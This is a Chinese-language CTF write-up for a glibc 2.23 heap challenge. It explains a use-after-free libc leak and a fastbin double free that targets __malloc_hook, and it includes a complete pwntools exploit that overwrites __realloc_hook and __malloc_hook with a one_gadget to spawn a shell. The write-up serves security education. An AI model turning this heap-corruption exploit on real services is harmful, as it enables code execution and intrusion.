# fast_note

## 题目简述

题目运行在 glibc 2.23。释放后指针未清空，可以读取 unsorted bin 指针并重复释放 fastbin chunk。目标是通过 fastbin double free 把分配位置引向 `__malloc_hook` 附近，再配合 `__realloc_hook`、`realloc` 和 one_gadget 获得 shell。

## 解题过程

先申请一个较大的 chunk 和隔离 chunk，释放大 chunk 后利用 UAF 读取 unsorted bin 的 `fd`，减去题目 libc 中的 `0x3c4b78` 得到基址。

glibc 2.23 从 fastbin 取 chunk 时会检查伪造 chunk 的 `size` 是否属于当前 size class，但不会检查地址对齐。`__malloc_hook-0x23` 附近包含来自 libc 指针高字节的 `0x7f`；从错位地址观察时，它可以充当 `0x70` chunk 的 size 值，所以请求 `0x60` 字节即可通过检查。

按 `A -> B -> A` 释放两个 `0x70` chunk 形成 fastbin double free，再把链表指向 `__malloc_hook-0x23`。最终 payload 同时布置 `__realloc_hook=one_gadget` 与 `__malloc_hook=realloc+6`；下一次 `malloc` 先进入 `realloc` 的合适位置调整栈，再由 `__realloc_hook` 跳转 one_gadget。

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)

if args.REMOTE:
    host = args.HOST or "challenge.example"
    port = int(args.PORT or 31337)
    io = remote(host, port)
else:
    io = process(elf.path)


def add(index: int, size: int, content: bytes) -> None:
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Content: ", content)


def delete(index: int) -> None:
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


def show(index: int) -> None:
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())


add(0, 0x90, b"A" * 8)
add(1, 0x10, b"gap")
delete(0)
show(0)

main_arena_pointer = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = main_arena_pointer - 0x3C4B78

one_gadget = libc.address + 0xF1247
realloc = libc.sym["realloc"]
malloc_hook = libc.sym["__malloc_hook"]

# fastbin A -> B -> A double free。
add(2, 0x60, b"aaaa")
add(3, 0x60, b"bbbb")
add(4, 0x10, b"gap")
delete(2)
delete(3)
delete(2)

add(5, 0x60, p64(malloc_hook - 0x23))
add(6, 0x60, b"/bin/sh\x00")
add(7, 0x60, b"padding")
add(
    8,
    0x60,
    b"aaa" + p64(0) + p64(one_gadget) + p64(realloc + 6),
)

# malloc 在读取 Content 之前触发 hook，因此无需再发送内容。
io.sendlineafter(b">", b"1")
io.sendlineafter(b"Index: ", b"9")
io.sendlineafter(b"Size: ", str(0x60).encode())
io.interactive()
```

one_gadget 偏移及 `realloc+6` 的选择都依赖题目提供的 glibc 2.23，应在同一 libc 下核对约束。原 PDF 没有记录最终 flag 文本。

## 方法总结

本题的重点是老版本 fastbin 的 size 检查与“不检查对齐”之间的差异。伪造目标并非真正合法的 chunk，而是借邻近指针的高字节错位出一个可接受 size。最终控制流还依赖 hook 的相邻布局和 one_gadget 栈约束，不能只写成“覆盖 malloc_hook 即可”。
